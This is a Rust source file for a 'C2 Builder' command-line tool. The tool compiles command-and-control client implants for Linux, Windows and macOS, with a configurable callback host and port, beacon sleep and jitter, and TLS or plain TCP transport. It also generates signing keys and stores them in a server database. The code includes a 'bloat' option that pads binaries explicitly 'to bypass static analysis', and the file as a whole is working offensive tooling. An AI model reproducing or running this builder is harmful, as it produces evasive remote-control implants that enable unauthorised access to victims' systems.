use clap::{Parser, ValueEnum};
use std::process::Command;
use std::fs;
use std::path::PathBuf;
use ed25519_dalek::SigningKey;
use rand::rngs::OsRng;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use uuid::Uuid;
use serde_json::json;
use anyhow::{Context, Result};
use rusqlite::{params, Connection};

#[derive(Parser)]
#[command(name = "C2 Builder")]
#[command(author = "SecureC2")]
#[command(version = "1.1")]
struct Cli {
    /// The C2 Server IP or Hostname
    #[arg(long, default_value = "127.0.0.1")]
    host: String,

    /// The C2 Server Port
    #[arg(long, default_value_t = 4443)]
    port: u16,

    /// Target Platform
    #[arg(long, value_enum, default_value_t = Platform::Linux)]
    platform: Platform,

    /// Transport Protocol
    #[arg(long, value_enum, default_value_t = Transport::Tls)]
    transport: Transport,

    /// Default Sleep Interval (Seconds)
    #[arg(long, default_value_t = 40)]
    sleep: u64,

    /// Min Jitter % (subtracted from sleep). Cannot represent > 100% reduction.
    #[arg(long, default_value_t = 20)]
    jitter_min: u32,

    /// Max Jitter % (added to sleep).
    #[arg(long, default_value_t = 10)]
    jitter_max: u32,

    /// Add dummy data (MB) to bypass static analysis
    #[arg(long, default_value_t = 0)]
    bloat: u64,

    /// Enable debug output in the client
    #[arg(long, default_value_t = false)]
    debug: bool,
}

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Platform {
    Linux,
    Windows,
    Macos,
}

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Transport {
    Tls,
    TcpPlain,
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    println!("\n=== SecureC2 Builder ===");
    println!("[*] Target:      {}", cli.host);
    println!("[*] Port:        {}", cli.port);
    println!("[*] Sleep:       {}s (-{}% / +{}%)", cli.sleep, cli.jitter_min, cli.jitter_max);

    // Validation
    if cli.jitter_min > 100 {
        anyhow::bail!("Jitter Min cannot exceed 100% (negative time is impossible).");
    }

    // 1. Generate Build ID & Keys
    let build_id = Uuid::new_v4().to_string();
    let hash_salt = Uuid::new_v4().to_string();
    println!("[*] Build ID:    {}", build_id);

    let mut csprng = OsRng;
    let signing_key = SigningKey::generate(&mut csprng);
    
    let verify_key = signing_key.verifying_key();
    let pub_key_b64 = BASE64.encode(verify_key.to_bytes());
    
    save_server_artifacts(&build_id, &signing_key)?;

    if let Err(e) = try_update_local_db(&build_id, &signing_key) {
        println!("[!] Could not auto-update local DB: {}", e);
        println!("[*] You must manually import 'dist/server_keys.json' to your server.");
    }

    // 2. Construct Configuration JSON
    let config_json = json!({
        "transport": match cli.transport { Transport::Tls => "tls", Transport::TcpPlain => "tcp_plain" },
        "c2_host": cli.host,
        "tunnel_port": cli.port,
        "sleep_interval": cli.sleep,
        "jitter_min": cli.jitter_min,
        "jitter_max": cli.jitter_max,
        "bloat_mb": cli.bloat,
        "debug": cli.debug,
        "server_public_key": pub_key_b64,
        "hash_salt": hash_salt,
        "build_id": build_id
    }).to_string();

    // 3. Determine Target Triple & Extension
    let (target, ext) = match cli.platform {
        Platform::Linux => ("x86_64-unknown-linux-gnu", ""),
        Platform::Windows => ("x86_64-pc-windows-gnu", ".exe"),
        Platform::Macos => ("x86_64-apple-darwin", ""),
    };

    println!("[*] Compiling client for {}...", target);

    // 4. Run Cargo Build with ENV Injection
    let status = Command::new("cargo")
        .args(["build", "--bin", "client", "--release", "--target", target])
        .env("C2_BUILD_CONFIG", &config_json)
        .status()
        .context("Failed to execute cargo build")?;

    if !status.success() {
        anyhow::bail!("Compilation failed.");
    }

    // 5. Move Artifact
    let src_path = PathBuf::from(format!("target/{}/release/client{}", target, ext));
    fs::create_dir_all("dist")?;
    
    let platform_name = cli.platform.to_possible_value().unwrap().get_name().to_string();
    let dest_path = PathBuf::from(format!("dist/client_{}_{}{}", platform_name, build_id.chars().take(8).collect::<String>(), ext));

    if src_path.exists() {
        fs::copy(&src_path, &dest_path)?;
        println!("\n[+] Build Success!");
        println!("[+] Binary: {}", dest_path.display());
    } else {
        anyhow::bail!("Artifact not found at {}", src_path.display());
    }

    Ok(())
}

fn save_server_artifacts(build_id: &str, key: &SigningKey) -> Result<()> {
    fs::create_dir_all("dist")?;
    let key_bytes = key.to_bytes();
    let key_b64 = BASE64.encode(key_bytes);
    
    let import_data = json!({
        "build_id": build_id,
        "private_key": key_b64,
        "note": "Import this into the server database table 'build_keys'"
    });

    fs::write("dist/server_keys.json", serde_json::to_string_pretty(&import_data)?)?;
    Ok(())
}

fn try_update_local_db(build_id: &str, key: &SigningKey) -> Result<()> {
    let db_path = "c2_audit.db";
    let conn = Connection::open(db_path)?;
    
    conn.execute(
        "CREATE TABLE IF NOT EXISTS build_keys (
            build_id TEXT PRIMARY KEY,
            private_key BLOB
        )",
        [],
    )?;

    conn.execute(
        "INSERT OR REPLACE INTO build_keys (build_id, private_key) VALUES (?1, ?2)",
        params![build_id, key.to_bytes()],
    )?;

    println!("[+] Automatically registered Build ID '{}' in local database.", build_id);
    Ok(())
}
